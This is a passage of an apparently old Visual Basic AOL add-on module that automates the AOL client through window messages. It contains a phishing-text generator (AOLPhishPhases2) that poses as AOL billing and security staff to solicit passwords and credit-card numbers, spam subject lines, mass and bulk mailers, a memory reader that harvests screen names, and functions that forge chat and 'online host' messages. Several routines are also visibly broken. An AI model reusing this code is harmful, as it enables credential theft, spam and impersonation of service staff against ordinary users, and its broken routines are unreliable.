    'force% flag set, ecrypt string regardless of tag
    EncryptFlag% = True
  End If
    


  'Set up variables
  PassUp = 1
  PassMax = Len(Password)
  
  
  'Tack on leading characters to prevent repetative recognition
  Password = Chr$(Asc(Left$(Password, 1)) Xor PassMax) + Password
  Password = Chr$(Asc(Mid$(Password, 1, 1)) Xor Asc(Mid$(Password, 2, 1))) + Password
  Password = Password + Chr$(Asc(Right$(Password, 1)) Xor PassMax)
  Password = Password + Chr$(Asc(Right$(Password, 2)) Xor Asc(Right$(Password, 1)))
  
  
  'If Encrypting add password check tag now so it is encrypted with string
  If EncryptFlag% = True Then
    strng = Left$(Password, 3) + Format$(Asc(Right$(Password, 1)), "000") + Format$(Len(Password), "000") + strng
  End If
  
  'Loop until scanned though the whole string
  For Looper = 1 To Len(strng)
DoEvents
    'Alter character code
    tochange = Asc(Mid$(strng, Looper, 1)) Xor Asc(Mid$(Password, PassUp, 1))

    'Insert altered character code
    Mid$(strng, Looper, 1) = Chr$(tochange)
    
    'Scroll through password string one character at a time
    PassUp = PassUp + 1
    If PassUp > PassMax + 4 Then PassUp = 1
      
  Next Looper

  'If encrypting we need to filter out all bad character codes (0, 10, 13, 26)
  If EncryptFlag% = True Then
    'First get rid of all CHR$(1) since that is what we use for our flag
    look = 1
    Do
      look = InStr(look, strng, Chr$(1))
      If look > 0 Then
        strng = Left$(strng, look - 1) + Chr$(1) + Chr$(2) + Mid$(strng, look + 1)
        look = look + 1
      End If
    Loop While look > 0

    'Check for CHR$(0)
    Do
      look = InStr(strng, Chr$(0))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(1) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(10)
    Do
      look = InStr(strng, Chr$(10))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(11) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(13)
    Do
      look = InStr(strng, Chr$(13))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(14) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(26)
    Do
      look = InStr(strng, Chr$(26))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(27) + Mid$(strng, look + 1)
    Loop While look > 0

    'Tack on encryted tag
    strng = Chr$(1) + "KT" + Chr$(1) + strng + Chr$(1) + "KT" + Chr$(1)

  Else
    
    'We decrypted so ensure password used was the correct one
    If Left$(strng, 9) <> Left$(Password, 3) + Format$(Asc(Right$(Password, 1)), "000") + Format$(Len(Password), "000") Then
      'Password bad cause error
      Error 31100
    Else
      'Password good, remove password check tag
      strng = Mid$(strng, 10)
    End If

  End If


  'Set function equal to modified string
  KTEncrypt = strng
  

  'Were out of here
  Exit Function


ErrorHandler:
  
  'We had an error!  Were out of here
  Exit Function

End Function

Public Sub Center(frmForm As Form)
   With frmForm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / 2
   End With
End Sub
Function RanSub()
Randomize
RN = Int((Val(15) * Rnd) + 1)
If RN = "0" Then Mail_Subject = "Hi"
If RN = "1" Then Mail_Subject = "Sup"
If RN = "2" Then Mail_Subject = "Whats Up!"
If RN = "3" Then Mail_Subject = "Re: Hi ya"
If RN = "4" Then Mail_Subject = "Who you?"
If RN = "5" Then Mail_Subject = "Give me a chance."
If RN = "6" Then Mail_Subject = "Give me 5 min of your time."
If RN = "7" Then Mail_Subject = "Help!"
If RN = "8" Then Mail_Subject = "Make your computer work for you."
If RN = "9" Then Mail_Subject = "We pay off your computer with no work."
If RN = "10" Then Mail_Subject = "I hate work."
If RN = "11" Then Mail_Subject = "Get lazy and earn money..5 min is all I want."
If RN = "12" Then Mail_Subject = "No work and high pay..we offer it"
If RN = "13" Then Mail_Subject = "Make your computer get a job!"
If RN = "14" Then Mail_Subject = "We want to employ your computer."
If RN = "15" Then Mail_Subject = "Computers wanted for slave labor."
If RN = "16" Then Mail_Subject = "Make money doing nothing..more info in here."


End Function


Public Function GetChildCount(ByVal hwnd As Long) As Long
Dim hChild As Long

Dim i As Integer
   
If hwnd = 0 Then
GoTo Return_False
End If

hChild = GetWindow(hwnd, GW_CHILD)
   

While hChild
hChild = GetWindow(hChild, GW_HWNDNEXT)
i = i + 1
Wend

GetChildCount = i
   
Exit Function
Return_False:
GetChildCount = 0
Exit Function
End Function

Public Sub AOLButton(but%)
Clickicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clickicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub
Function AOLGetRoomPeople(lst As ListBox)
findchat = FindChildByTitle(AOLMDI, "Find a Chat")
If findchat = 0 Then
MsgBox ("Please Open the Find a Chat Window and click on a room to gather names from.")
GoTo Last
End If
room = FindChildByTitle(AOLMDI, "Who's Chatting")
AOLButton (who)
'Call AddRoomByBox(lst)
room = FindChildByTitle(AOLMDI, "Who's Chatting")
killwin (room)
Last:
End Function
Function AOLIMSTATIC(Newcaption As String)
anti1% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
Sts% = FindChildByClass(anti1%, "_AOL_Static")
ST% = GetWindow(Sts%, GW_HWNDNEXT)
ST% = GetWindow(ST%, GW_HWNDNEXT)
Call ChangeCaption(ST%, Newcaption)
End Function

Function AOLGetUser()
On Error Resume Next

aol& = FindWindow("AOL Frame25", "America  Online")
MDI& = FindChildByClass(aol&, "MDIClient")
Welcome% = FindChildByTitle(MDI&, "Welcome, ")
WelcomeLength& = GetWindowTextLength(Welcome%)
WelcomeTitle$ = String$(200, 0)
a& = GetWindowText(Welcome%, WelcomeTitle$, (WelcomeLength& + 1))
User$ = Mid$(WelcomeTitle$, 10, (InStr(WelcomeTitle$, "!") - 10))
AOLGetUser = User$
End Function

Sub IM_Off()
Call AOLInstantMessage("$IM_OFF", "HypesV2")
End Sub

Sub IM_On()
Call AOLInstantMessage("$IM_ON", "HypesV2")

End Sub


Sub AOLChatSend(txt)
room% = AOLFindRoom()
Call AOLSetText(FindChildByClass(room%, "_AOL_Edit"), txt)
DoEvents
Call SendCharNum(FindChildByClass(room%, "_AOL_Edit"), 13)
'A1000% = FindChildByClass(Room%, "_AOL_Edit")
'A2000% = GetWindow(A1000%, 2)
'AOLIcon (A2000%)

End Sub


Sub AOLClose(winew)
closes = SendMessage(winew, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLEightLine(txt As TextBox)
a = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(a, D)
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.7
End Sub

Sub AOLCursor()
Call RunMenuByString(AOLWindow(), "&About America Online")
Do: DoEvents
Loop Until FindWindow("_AOL_Modal", vbNullString)
SendMessage FindWindow("_AOL_Modal", vbNullString), WM_CLOSE, 0, 0
End Sub

Function AOLFindRoom()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Edit")
listere% = FindChildByClass(childfocus%, "_AOL_View")
listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function
Function FindOpenMail()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "RICHCNTL")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindOpenMail = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function

Function FindForwardWindow()
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(MDI%, 5)

While childfocus%
listers% = FindChildByTitle(childfocus%, "Send Now")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function



Function AOLGetChat()
childs% = AOLFindRoom()
child = FindChildByClass(childs%, "_AOL_View")


GetTrim = SendMessageByNum(child, 14, 0&, 0&)
Trimspace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, Trimspace$)

theview$ = Trimspace$
AOLGetChat = theview$
End Function

Sub ADD_AOL_LB(itm As String, lst As ListBox)
If lst.ListCount = 0 Then
lst.AddItem itm
Exit Sub
End If
Do Until xx = (lst.ListCount)
Let diss_itm$ = lst.List(xx)
If Trim(LCase(diss_itm$)) = Trim(LCase(itm)) Then Let do_it = "NO"
Let xx = xx + 1
Loop
If do_it = "NO" Then Exit Sub
lst.AddItem itm
End Sub
Sub AOLAntiIdle()
aol% = FindWindow("_AOL_Modal", vbNullString)
xstuff% = FindChildByTitle(aol%, "Favorite Places")
If xstuff% Then Exit Sub
xstuff2% = FindChildByTitle(aol%, "File Transfer *")
If xstuff2% Then Exit Sub
yes% = FindChildByClass(aol%, "_AOL_Button")
AOLButton yes%
End Sub

Sub AOLGetMemberProfile(name As String)
AOLRunMenuByString ("Get a Member's Profile")
pause 0.3
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
prof% = FindChildByTitle(MDI%, "Get a Member's Profile")
putname% = FindChildByClass(prof%, "_AOL_Edit")
Call AOLSetText(putname%, name)
okbutton% = FindChildByClass(prof%, "_AOL_Button")
AOLButton okbutton%
End Sub

Sub AOLlocateMember(name As String)
AOLRunMenuByString ("Locate a Member Online")
pause 0.3
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
prof% = FindChildByTitle(MDI%, "Locate Member Online")
putname% = FindChildByClass(prof%, "_AOL_Edit")
Call AOLSetText(putname%, name)
okbutton% = FindChildByClass(prof%, "_AOL_Button")
AOLButton okbutton%
closes = SendMessage(prof%, WM_CLOSE, 0, 0)
End Sub
Function FindIMTextwindow()
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMTextwindow = FindChildByClass(IM%, "RICHCNTL")
End Function
Function FindIMCaption()
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
FindIMCaption = FindChildByClass(IM%, "_AOL_Static")
End Function
Function ChangeIMCaption(txt As String)
IM% = FindChildByTitle(AOLMDI(), "  Instant Message From:")
IMtext% = FindChildByClass(IM%, "_AOL_Static")
Call ChangeCaption(IMtext%, txt)
End Function
Function Mail_GetErrorMessage()
Errors2% = FindChildByTitle(AOLMDI(), "Error")
IMtext% = FindChildByClass(Errors2%, "_AOL_VIEW")
Mail_GetErrorMessage = AOLGetText(IMtext%)
End Function
Function MassMailer(SNsToMail As ListBox, MailSelectedList As ListBox, MailMessage As String, status As TextBox, frm As Form)
'SNs4 = AddListToMailString(SNsToMail)
'The address to mail are in SNs
'MailSelectedList should have the highlighted mails to send.
'TheCount = The number of files to mail.
'Current = Our Loop Counter
AOLChangeCaption "|Genghis| Preparing the Mass Mail.."
SetPreference
AOLRunMenuByString ("Read &New Mail")
WaitForLoadedMail
AOLChangeCaption "|Genghis| Thinking..."
pause (1)
TheCOunt = CountSelected(MailSelectedList)
Current = -1
Mailing:
Current = Current + 1
'~~~~~~~~~~~~~
AOLChangeCaption "|Genghis| Starting Mass Mailer.."
Start:
AOLChangeCaption "Sending Mail " & Current + 1 & " of " & TheCOunt
themail = SearchForSelected(MailSelectedList)
Mail_SetCursor (themail)
WaitaWhile:
pause (0.2)
Mail_PressEnter
X = FindOpenMail
If X = 0 Then GoTo WaitaWhile
Mail_ClickForward
X = 0
X = Mail_ForwardMail(SNs4, MailMessage)
killwin (FindOpenMail())
Mail_KeepAsNew
MailSelectedList.Selected(Current) = False
'~~~~~~~~~~~~~
If Current = TheCOunt Then GoTo Last
GoTo Start
Last:
End Function
Sub AntiIdle()
aol% = FindWindow("_AOL_Modal", vbNullString)
xstuff% = FindChildByTitle(aol%, "Favorite Places")
If xstuff% Then Exit Sub
xstuff2% = FindChildByTitle(aol%, "File Transfer *")
If xstuff2% Then Exit Sub
yes% = FindChildByClass(aol%, "_AOL_Button")
AOLButton yes%
End Sub
Sub AOLAnti()
Do
'Put Call AOL_Anti_Punt in a button
Anti% = FindChildByTitle(AOLMDI(), "Untitled")
IMRich% = FindChildByClass(Anti%, "RICHCNTL")
Call AOLSetText(Anti%, "shlep's anti punter v1 · punt blocked")
DoEvents:
If IMRich% <> 0 Then
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
LabHIDE = ShowWindow(Anti%, SW_HIDE)
AOLChatSend "‹–«›–›  shlep's anti punter v¹  ‹–‹»–›"
AOLChatSend "‹–«›–›  " & LCase$(SNfromIM()) & ", you punting me?  ‹–‹»–›"
AOLChatSend "‹–«›–›  you have been rejected kweer0!  ‹–‹»–›"
End If
Loop
End Sub
Sub AOLCatWatch()
Do
'    y% = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo lol
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
w = InStr(LCase$(namez$), LCase$("catwatch"))
X = InStr(LCase$(namez$), LCase$("catid"))
If w <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Cat had entered the room."
End If
If X <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Cat had entered the room."
End If
Next Index%
lol:
Loop
End Sub
Sub AOLChangeWavDirect(wav As String)
'change the directory of the wav's
'AOLChangeWavDirect("C:\aol30\download")
Open "C:\AOL25\tool\chat.aol" For Binary As #1
Seek #1, 6935
Put #1, , wav
Close #1
End Sub
Public Sub AOLChangeWelcome(newwelcome As String)
Welc% = FindChildByTitle(AOLMDI(), "Welcome, " & AOLGetUser & "!")
Call AOLSetText(Welc%, newwelcome)
End Sub
Public Sub AOLChatManipulator(who$, what$)
View% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "" & (who$) & ":" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(View%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLClearChatRoom()
'clears the chat room
X$ = Format$(String$(100, Chr$(13)))
Call AOLChatManipulator(" ", X$)
a = String(116, Chr(32))
D = 116 - Len(txt)
C$ = Left(a, D)
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.3
AOLChatSend "" + txt.Text + "" & C$ & "" + txt.Text + ""
pause 0.7
End Sub
Sub AOLEmergency()
Do
'Put Call AOL_Anti_Punt in a button
Anti% = FindChildByTitle(AOLMDI(), "Untitled")
IMRich% = FindChildByClass(Anti%, "RICHCNTL")
DoEvents:
If IMRich% <> 0 Then
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRich%, WM_CLOSE, 0, 0)
LabHIDE = ShowWindow(Anti%, SW_HIDE)
AOLChatSend "‹–«›–›  shlep's anti punter v¹  ‹–‹»–›"
AOLChatSend "‹–«›–›  " & LCase$(SNfromIM()) & ", you punting me?  ‹–‹»–›"
AOLChatSend "‹–«›–›  emergency has owned your ass  ‹–‹»–›"
End If
Loop
End Sub


Sub AOLGuideWatch()
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call AOLKeyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub WaitForLoadedMail()
Do
box = FindChildByTitle(FindWindow("AOL Frame25", "America  Online"), "New Mail")
pause (0.1)
Loop Until box <> 0
List = FindChildByClass(box, "_AOL_Tree")
Do
DoEvents
MailNum = SendMessage(List, LB_GETCOUNT, 0, 0&)
Call pause(0.5)
MailNum2 = SendMessage(List, LB_GETCOUNT, 0, 0&)
Call pause(0.5)
MailNum3 = SendMessage(List, LB_GETCOUNT, 0, 0&)
Loop Until MailNum = MailNum2 And MailNum2 = MailNum3
    MailNum = SendMessage(List, LB_GETCOUNT, 0, 0&)

End Sub
Sub AOLHostManipulator(what$)
'AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
View% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "embassy termer ownz you:" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(View%, WM_SETTEXT, 0, Buffy$)
End Sub
Function Chat_FindTheWin() As Integer
  Dim genhWnd%
  Dim AOLChildhWnd%
  Dim ChildWnd As Integer
  Dim ControlWnd As Integer
  Dim ChatWnd As Integer
  Dim TargetsFound As Integer
  Dim RetClsName As String * 255
  Dim X%
genhWnd% = GetWindow(FindWindow("AOL Frame25", 0&), GW_CHILD)
Do
  X% = GetClassName(genhWnd%, RetClsName$, 254)
    If InStr(RetClsName$, "MDIClient") Then
      AOLChildhWnd% = genhWnd% 'Child window found!
    End If
  genhWnd% = GetWindow(genhWnd%, GW_HWNDNEXT)
  DoEvents
Loop While genhWnd% <> 0
ChildWnd = GetWindow(AOLChildhWnd%, GW_CHILD)
Do
  ControlWnd = GetWindow(ChildWnd, GW_CHILD)
  Do
    X% = GetClassName(ControlWnd, RetClsName$, 254)

    
    If InStr(RetClsName$, "_AOL_Edit") Then
      TargetsFound = TargetsFound + 1
    ElseIf InStr(RetClsName$, "_AOL_View") Then
      TargetsFound = TargetsFound + 1
    ElseIf InStr(RetClsName$, "_AOL_Listbox") Then
      TargetsFound = TargetsFound + 1:
    End If
    ControlWnd = GetWindow(ControlWnd, GW_HWNDNEXT)
    DoEvents
  Loop While ControlWnd <> 0

  If TargetsFound = 3 Then ChatWnd = ChildWnd: Exit Do

  
  ChildWnd = GetWindow(ChildWnd, GW_HWNDNEXT)
Loop While ChildWnd <> 0
Chat_FindTheWin = ChatWnd

End Function
Sub Click(Button%)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button%, WM_LBUTTONUP, &HD, 0)
End Sub
Function AOLKillDupes()
'Gets rid of excess mail
Num = AOLCountMail()
DELNUM% = 0
aol% = FindWindow("AOL Frame25", 0&)
mld% = FindChildByClass(aol%, "MDIClient")
FNMB% = FindChildByTitle(mld%, "New Mail")
If FNMB% = 0 Then
AOLRunTool (1)
pause (0.4)
Do: DoEvents
    NMB% = FindChildByTitle(mofo%, "New Mail")
    pause (0.1)
Loop Until NMB% <> 0
WaitForLoadedMail
End If

Do: DoEvents
LSTTXT$ = ","
DELTXT$ = ","
btnDEL% = FindChildByTitle(FindChildByTitle(mofo%, "New Mail"), "Delete")
If AOLCountMail() = 0 Then MsgBox "You have no New Mail.", 12, "Dupe Killer": Exit Function
List% = FindChildByClass(FindChildByTitle(mofo%, "New Mail"), "_AOL_Tree")
For i = 0 To AOLCountMail() - 1
Ln = SendMessage(List%, LB_GETTEXTLEN, i, 0)
If Ln = -1 And i >= AOLCountMail() Then
    Exit For
ElseIf Ln = -1 And i <= AOLCountMail() Then
    MAILTXT$ = String$(60, 0)
Else
    MAILTXT$ = String$(Ln, 0)
End If
GTTXT = SendMessageByString(List%, LB_GETTEXT, i, MAILTXT$)
MAILTXT$ = Right$(MAILTXT$, Len(MAILTXT$) - InStr(InStr(MAILTXT$, Chr$(9)) + 1, MAILTXT$, Chr$(9)))
If InStr(LSTTXT$, "," & MAILTXT$ & ",") And InStr(DELTXT$, "," & MAILTXT$ & ",") = 0 Then
            X = SendMessage(List%, LB_SETCURSEL, i, 0)
            Call Click(btnDEL%)
            DELNUM% = DELNUM% + 1
            Num = Num - 1
            i = i - 1
            DELTXT$ = DELTXT$ + MAILTXT$ + ","
Else
LSTTXT$ = LSTTXT$ + MAILTXT$ + ","
End If
Next i
Loop Until Len(DELTXT$) = 1
MsgBox "There were " & DELNUM% & " duplicate mails deleted.", 12, "Dupe Count"
Mail_KillDupes = DELNUM%
End Function
Sub AOLMakeMeParent(frm As Form)
'AOLMakeParent Me
'this makes the form an aol parent
aol% = FindChildByClass(FindWindow("AOL Frame25", 0&), "MDIClient")
SetAsParent = SetParent(frm.hwnd, aol%)
End Sub
Sub AOlocateMember(name As String)
'locates, if possible, member "name"
AOLRunMenuByString ("Locate a Member Online")
pause 0.3
aol% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(aol%, "MDIClient")
prof% = FindChildByTitle(MDI%, "Locate Member Online")
putname% = FindChildByClass(prof%, "_AOL_Edit")
Call AOLSetText(putname%, name)
okbutton% = FindChildByClass(prof%, "_AOL_Button")
AOLButton okbutton%
closes = SendMessage(prof%, WM_CLOSE, 0, 0)
End Sub
Function AOLPhishPhases2() As String
Randomize
    phrases = 7
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = "Pardon Me, "
      If phrase = 2 Then T$ = "Good evening, "
      If phrase = 3 Then T$ = "Hello, And welcome to America Online. "
      If phrase = 4 Then T$ = "Welcome to America Online. "
      If phrase = 5 Then T$ = "Excuse me, "
      If phrase = 6 Then T$ = "Dear User, "
      If phrase = 7 Then T$ = "What's Up! "
    phrases = 7
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & "I am with America Online Billing "
      If phrase = 2 Then T$ = T$ & "I am with OTC (Online Techincal Consultants) "
      If phrase = 3 Then T$ = T$ & "I am with WWWC (World Wide Web Consultants) "
      If phrase = 4 Then T$ = T$ & "I am with AOL Techincal Staff "
      If phrase = 5 Then T$ = T$ & "I am with AOL System Security "
      If phrase = 6 Then T$ = T$ & "I am with AOL Resource Department "
      If phrase = 7 Then T$ = T$ & "I am with the AOL Community Action Team "
    phrases = 7
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & "and due to Technical Failures "
      If phrase = 2 Then T$ = T$ & "and due to Billing errors "
      If phrase = 3 Then T$ = T$ & "and due to Line Noise "
      If phrase = 4 Then T$ = T$ & "and due to A virus in our database "
      If phrase = 5 Then T$ = T$ & "and due to Massive data flow in our database "
      If phrase = 6 Then T$ = T$ & "and due to data corruption "
      If phrase = 7 Then T$ = T$ & "and due to hackers by-passing out systems "

    phrases = 5
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & "we seem to have lost your password. "
      If phrase = 2 Then T$ = T$ & "we seem to have lost your account information. "
      If phrase = 3 Then T$ = T$ & "we seem to have failed to recieve your logon password. "
      If phrase = 4 Then T$ = T$ & "we seem to have failed to recieve your account information. "
      If phrase = 5 Then T$ = T$ & "we have lost your Credit Card information. "
    phrases = 4
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & "To correct this situation please click respond and enter "
      If phrase = 2 Then T$ = T$ & "Please click respond and enter your "
      If phrase = 3 Then T$ = T$ & "Please help us by entering your "
      If phrase = 4 Then T$ = T$ & "Please respond with your "
    phrases = 3
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & "Your password information."
      If phrase = 2 Then T$ = T$ & "Your current account password."
      If phrase = 3 Then T$ = T$ & "Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number."
    phrases = 4
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & " Please respond within 2 minutes to keep this account active."
      If phrase = 2 Then T$ = T$ & " It is very important that you respond immediately."
      If phrase = 3 Then T$ = T$ & " Please respond as soon as possible "
      If phrase = 4 Then T$ = T$ & " Incooperation may lead to termination of your account."
    phrases = 4
    phrase = Int(Rnd * phrases + 1)
      If phrase = 1 Then T$ = T$ & " Thank you for using America Online."
      If phrase = 2 Then T$ = T$ & " Thank you for your time."
      If phrase = 3 Then T$ = T$ & " Thank you for your cooperation."
      If phrase = 4 Then T$ = T$ & " Thank you for your help and enjoy the service!"
Generate = T$
End Function

Function BulkMailList(lst As ListBox)
Mail_Message = " "
Mail_BulkSetup
For dolist = 0 To lst.ListCount - 1
pause (0.2)
lst.Selected(dolist) = True
NameListing = lst.List(dolist) & ", " & lst.List(dolist + 1) & ", " & lst.List(dolist + 2) & ", " & lst.List(dolist + 3) & ", " & lst.List(dolist + 4) & ", " & lst.List(dolist + 5) & ", " & lst.List(dolist + 6) & ", " & lst.List(dolist + 7) & ", " & lst.List(dolist + 8)
'NameListing = TheNames
Mail_ClickForward
Call Mail_ForwardMail
dolist = dolist + 7
AOLChangeCaption ("Mailing #" & dolist & " of " & lst.ListCount)
If dolist > lst.ListCount Then GoTo Last
Next dolist
Last:
End Function

Function FindMailBox()
FindMailBox = FindChildByTitle(AOLMDI(), "New Mail")
End Function
Function MemberMore()
thewin% = MemberDirectory
more% = FindChildByClass(thewin%, "_AOL_Icon")
pause (1.5)
Click more%
pause (1.5)
Click more%
pause (1.5)
Click more%
pause (1.5)
Click more%
pause (1.5)
Click more%
pause (1.5)
Click more%
pause (1.5)
Click more%
End Function
Function MemberDirectory()
MemberDirectory = FindChildByTitle(AOLMDI(), "Member Directory")
End Function
Function MemberDirSearch(txt As String)
memberd% = MemberDirectory
memsearch% = FindChildByClass(memberd%, "_AOL_Edit")
Call AOLSetText(memsearch%, txt)
Call SendCharNum(memsearch%, 13)
DoEvents
Start:
X% = FindChildByTitle(AOLMDI(), "Member Directory Search Results")
If X% = 0 Then GoTo Start
Last:
End Function
Function MemberSetMonth(txt As String)

OpenMemberDirectory
MemB% = MemberDirectory
X% = FindChildByClass(MemB%, "_AOL_Icon")
thenext% = GetWindow(X%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
thenext% = GetWindow(thenext%, GW_HWNDNEXT)
LK:
pause (1)
Click (thenext%)
box1% = FindChildByClass(MemB%, "_AOL_Edit")
thenext2% = GetWindow(box1%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
thenext2% = GetWindow(thenext2%, GW_HWNDNEXT)
If thenext2% = 0 Then GoTo LK
Call AOLSetText(thenext2%, txt)
End Function
Function GetMLMBox()
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
filenum = FreeFile
'Open (Form1.TheFile.Text) For Append As filenum
Buff = 0
mailwin = FindMarket()
AOLHandle = FindChildByClass(mailwin, "_AOL_Listbox")
'Form1.Gauge1.Max = SendMessage(AOLHandle, LB_GETCOUNT, 0, 0)
AOLThread = GetWindowThreadProcessId(AOLHandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(AOLHandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(AOLHandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6
Person$ = String$(100, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)
Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)

a = Len(Person$)
Person$ = Right$(Person$, a - 1)
'~~~~~~~~~~~~~~

Dim thecaption, Captionlen, middlelen, Firstletter, Middle
If Person$ = "" Then GoTo dead
thecaption = Person$
Captionlen = Len(thecaption)
AG:
Middle = Right(thecaption, middlelen)
middlelen = Captionlen - 1
Firstletter = Left$(Middle, 1)
If Firstletter = Chr(9) Then GoTo dead
Captionlen = Captionlen - 1
GoTo AG

dead:
Person$ = Middle
For words = Len(Person$) To 1 Step -1
oneletter2 = Mid(Person$, words, 1)
Oneletter = Mid(Person$, 1, words)
If oneletter2 = Chr(9) Then
   Oneletter = Mid(Person$, 1, words)
   Oneletter = Mid(Person$, 1, words)
1   GoTo Last
   End If
Next words
Last:
'Oneletter
Letters = Len(Oneletter)
Thesnlen = Letters - 1
finalsn = Left$(Oneletter, Thesnlen)
Person$ = finalsn

'~~~~~~
pause (0.001)
Person$ = TrimReturns(Person$)
'If Form1.OP1.Value = True Then Print #filenum, person$
'If Form1.op2.Value = True Then Print #filenum, person$ & "@AOL.COM"
'Form1.Gauge1.Value = Index
Next Index
Call CloseHandle(AOLProcessThread)
End If
Close filenum
'Form1.Gauge1.Value = 0
killwin (mailwin)
'Form1.status.Caption = Form1.status.Caption + Index
End Function
Function MemberGather(box As ListBox)
'''''''''''
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
